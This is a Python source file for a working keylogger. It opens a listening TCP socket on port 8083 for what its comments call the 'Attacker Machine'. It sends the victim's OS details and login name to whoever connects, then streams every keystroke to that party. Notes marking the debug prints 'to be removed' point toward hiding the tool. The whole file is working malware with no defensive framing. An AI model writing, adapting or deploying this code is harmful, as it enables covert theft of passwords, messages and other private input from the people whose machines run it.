import platform,os,socket
from pynput import keyboard
from pynput.keyboard import Key

def C_server(ip,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creating TCP-Ipv4 socket 
    print('Socket has been created\n')# to be removed
    try:
        sock.bind((ip, port)) # Binding To (Ip,Port)
        print('host Succesfully binded !\n')# to be removed
    except Exception as err: # error hundling
        print ('Binding has failed. Error Code is : ',err)# to be removed
        exit()

    return sock # return socket object

def conn_hundler(sock):
    try :    
        sock.listen(1) # Listening For Connection From Attacker Machine
        connection_infos ,(client_host, client_port) = sock.accept() # Accepting connection and retrieving Connection Informations
        print(f'Connection From: {client_host} on Port {client_port}\n')# to be removed
        connection_infos.sendall(f" Your Connected to a : {platform.uname().system} && version : {platform.uname().version} && User : {os.getlogin( )} \n".encode()) # sending Some Basic informations about "OS" of the Target
    except Exception as e : # error hundling 
        print('failed to listen ! : '+e)# to be removed

    return connection_infos # return connection informations 

def Sender(remote_host,data):
    try : 
        remote_host.sendall(data.encode()) # Sending Informations encoded to the Attacker machine
        return True
    except Exception as e : # error hundling 
        print(f'Error While Sending :{e} ')# to be removed
        exit()

def receiver(remote_host):   
    cmd = remote_host.recv(2048)
    if len(cmd.decode()) != 0 and cmd.decode() == 'exit': # if it's a echap key 
        print("here is the CMD : ",cmd.decode())
        exit() # quit the programm
    return True

def on_press(key):
    pr_key = str(key) # Key object ---> Str 
    if type(key) != type(Key.esc): # If It's Not A Special key
        print(f" pressed : {pr_key} \n") # to be removed
        Sender(remote_host,pr_key) # sending informations
        receiver(remote_host)
    if key == Key.enter: # If It's A Special key ( Enter Key)
        print(f" pressed : {pr_key} \n")# to be removed
        Sender(remote_host,' \n ')   # send a '\n' for better formatting
        receiver(remote_host)
    if type(key) == type(Key.esc): # If It's A Special key
        print(f" pressed : {pr_key} \n")# to be removed
        Sender(remote_host,' '+pr_key+' ') # for better formatting 
        receiver(remote_host) 
    return True    

def on_release(key):
    #receiver(remote_host)
    if key == Key.esc: # if it's a echap key 
        exit() # quit the programm

def wait_for_user_input():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release) # creating listener object
    listener.start() # start the listener thread 
    listener.join() # wait till listener will stop
    # other stuff 

remote_host = conn_hundler(C_server('0.0.0.0',8083)) # to be used in on_press func 


print(wait_for_user_input()) # main
